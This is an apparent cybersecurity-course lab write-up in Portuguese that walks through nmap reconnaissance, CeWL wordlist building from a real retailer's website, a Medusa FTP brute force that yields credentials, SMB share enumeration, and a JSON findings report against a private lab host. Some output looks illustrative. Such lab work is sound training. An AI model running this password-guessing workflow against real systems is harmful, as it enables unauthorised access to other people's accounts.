@@ -1,0 +1,61 @@
+🖼️ Imagem 1: Reconhecimento do Alvo (Nmap)
+
+kali@kali:~$ nmap -sV 192.168.56.101
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 192.168.56.101
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+80/tcp   open  http        Apache httpd 2.2.8
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  microsoft-ds Samba smbd 3.X - 4.X
+Service Info: OS: Unix
+
+
+🖼️ Imagem 2: Preparação de Wordlists (CeWL & OSINT)
+
+kali@kali:~$ cewl https://www.rchlo.com.br -m 6 -w rchlo_base.txt
+kali@kali:~$ head -n 8 rchlo_base.txt
+Riachuelo
+RCHLO
+Logistica
+Varejo
+Sustentabilidade
+Colecao
+Atendimento
+Ecommerce
+
+🖼️ Imagem 3: Execução Tática - FTP Brute Force (Medusa)
+
+kali@kali:~$ medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
+Medusa v2.2 [http://www.foofus.net/jmk/medusa/medusa.html] (C) JoMo-Kun
+ACCOUNT FOUND: [192.168.56.101] User: service_admin - Pass: 123456 [SUCCESS]
+
+
+🖼️ Imagem 4: Validação de Acesso - SMB/CIFS (smbclient)
+
+kali@kali:~$ smbclient -L //192.168.56.101 -U service_admin
+Password for [WORKGROUP\service_admin]:
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    C$              Disk      Default share
+    ADMIN$          Disk      Remote Admin
+    IPC$            IPC       Remote IPC
+
+
+🖼️ Imagem 5: Relatório de Inteligência Automatizado (JSON)
+
+{
+    "audit_summary": "Simulação de Adversário RCHLO/DIO",
+    "timestamp": "2026-05-10T12:00:00Z",
+    "critical_findings": [
+        {
+            "host": "192.168.56.101",
+            "service": "FTP",
+            "user": "service_admin",
+            "status": "COMPROMISED",
+            "risk_level": "CRITICAL"
+        }
+    ]
+}
+
